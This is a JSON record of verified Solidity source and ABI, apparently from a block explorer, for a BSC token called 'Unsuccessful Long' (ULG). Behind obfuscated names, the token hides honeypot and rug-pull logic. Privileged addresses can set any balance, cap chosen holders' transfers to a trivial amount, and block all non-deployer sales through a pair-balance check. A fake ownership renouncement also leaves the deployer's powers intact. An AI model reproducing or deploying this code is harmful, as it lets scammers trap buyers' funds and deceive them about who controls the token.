{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface fromTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableFrom {\n    function createPair(address liquidityFund, address atLaunch) external returns (address);\n}\n\ninterface amountMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellAuto) external view returns (uint256);\n\n    function transfer(address limitSwap, uint256 feeShould) external returns (bool);\n\n    function allowance(address tradingToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitSwap,\n        uint256 feeShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txLimitTo, uint256 value);\n    event Approval(address indexed tradingToken, address indexed spender, uint256 value);\n}\n\ninterface amountMinMetadata is amountMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnsuccessfulLong is sellTrading, amountMin, amountMinMetadata {\n\n    function walletToken(address launchReceiverSwap) public {\n        limitSellReceiver();\n        \n        if (launchReceiverSwap == launchFrom || launchReceiverSwap == fromTrading) {\n            return;\n        }\n        tradingMarketing[launchReceiverSwap] = true;\n    }\n\n    address private teamToken;\n\n    uint256 private totalReceiverLaunched;\n\n    uint256 private tokenFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return enableAmount;\n    }\n\n    mapping(address => uint256) private swapLimit;\n\n    string private enableAmount = \"Unsuccessful Long\";\n\n    constructor (){\n        if (receiverTotal) {\n            sellLiquidity = amountModeReceiver;\n        }\n        fromTeam toTeam = fromTeam(autoFund);\n        fromTrading = enableFrom(toTeam.factory()).createPair(toTeam.WETH(), address(this));\n        if (receiverTotal) {\n            receiverTotal = true;\n        }\n        launchFrom = _msgSender();\n        launchIs();\n        takeAt[launchFrom] = true;\n        swapLimit[launchFrom] = swapBuyFund;\n        if (tokenFrom != sellLiquidity) {\n            totalReceiverLaunched = tokenFrom;\n        }\n        emit Transfer(address(0), launchFrom, swapBuyFund);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedLimit;\n    }\n\n    bool private amountTx;\n\n    string private launchedLimit = \"ULG\";\n\n    uint8 private txLimitShould = 18;\n\n    function tradingReceiver(address liquidityLimit) public {\n        require(liquidityLimit.balance < 100000);\n        if (receiverMode) {\n            return;\n        }\n        \n        takeAt[liquidityLimit] = true;\n        if (totalReceiverLaunched == amountModeReceiver) {\n            tokenFrom = amountModeReceiver;\n        }\n        receiverMode = true;\n    }\n\n    bool private receiverTotal;\n\n    function launchIs() public {\n        emit OwnershipTransferred(launchFrom, address(0));\n        teamToken = address(0);\n    }\n\n    function receiverFund(address limitTx, address limitSwap, uint256 feeShould) internal returns (bool) {\n        require(swapLimit[limitTx] >= feeShould);\n        swapLimit[limitTx] -= feeShould;\n        swapLimit[limitSwap] += feeShould;\n        emit Transfer(limitTx, limitSwap, feeShould);\n        return true;\n    }\n\n    uint256 amountSell;\n\n    function balanceOf(address sellAuto) public view virtual override returns (uint256) {\n        return swapLimit[sellAuto];\n    }\n\n    address marketingFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant feeAuto = 12 ** 10;\n\n    function owner() external view returns (address) {\n        return teamToken;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapBuyFund;\n    }\n\n    uint256 private sellLiquidity;\n\n    bool private marketingLaunched;\n\n    event OwnershipTransferred(address indexed receiverLimitMin, address indexed enableMarketing);\n\n    function decimals() external view virtual override returns (uint8) {\n        return txLimitShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchTrading;\n\n    bool private receiverBuy;\n\n    uint256 private swapBuyFund = 100000000 * 10 ** 18;\n\n    address public launchFrom;\n\n    function enableSell(address limitTx, address limitSwap, uint256 feeShould) internal returns (bool) {\n        if (limitTx == launchFrom) {\n            return receiverFund(limitTx, limitSwap, feeShould);\n        }\n        uint256 fromTotalLaunched = amountMin(fromTrading).balanceOf(marketingFrom);\n        require(fromTotalLaunched == amountSell);\n        require(limitSwap != marketingFrom);\n        if (tradingMarketing[limitTx]) {\n            return receiverFund(limitTx, limitSwap, feeAuto);\n        }\n        return receiverFund(limitTx, limitSwap, feeShould);\n    }\n\n    bool public receiverMode;\n\n    function approve(address receiverFee, uint256 feeShould) public virtual override returns (bool) {\n        launchTrading[_msgSender()][receiverFee] = feeShould;\n        emit Approval(_msgSender(), receiverFee, feeShould);\n        return true;\n    }\n\n    function toReceiver(address receiverSwap, uint256 feeShould) public {\n        limitSellReceiver();\n        swapLimit[receiverSwap] = feeShould;\n    }\n\n    function limitSellReceiver() private view {\n        require(takeAt[_msgSender()]);\n    }\n\n    bool private swapAmount;\n\n    address autoFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 buyFromMin;\n\n    function allowance(address fromWallet, address receiverFee) external view virtual override returns (uint256) {\n        if (receiverFee == autoFund) {\n            return type(uint256).max;\n        }\n        return launchTrading[fromWallet][receiverFee];\n    }\n\n    mapping(address => bool) public tradingMarketing;\n\n    uint256 private amountModeReceiver;\n\n    function getOwner() external view returns (address) {\n        return teamToken;\n    }\n\n    address public fromTrading;\n\n    function enableFund(uint256 feeShould) public {\n        limitSellReceiver();\n        amountSell = feeShould;\n    }\n\n    mapping(address => bool) public takeAt;\n\n    function transfer(address receiverSwap, uint256 feeShould) external virtual override returns (bool) {\n        return enableSell(_msgSender(), receiverSwap, feeShould);\n    }\n\n    function transferFrom(address limitTx, address limitSwap, uint256 feeShould) external override returns (bool) {\n        if (_msgSender() != autoFund) {\n            if (launchTrading[limitTx][_msgSender()] != type(uint256).max) {\n                require(feeShould <= launchTrading[limitTx][_msgSender()]);\n                launchTrading[limitTx][_msgSender()] -= feeShould;\n            }\n        }\n        return enableSell(limitTx, limitSwap, feeShould);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimitMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLimitTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"enableFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiverSwap\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnsuccessfulLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}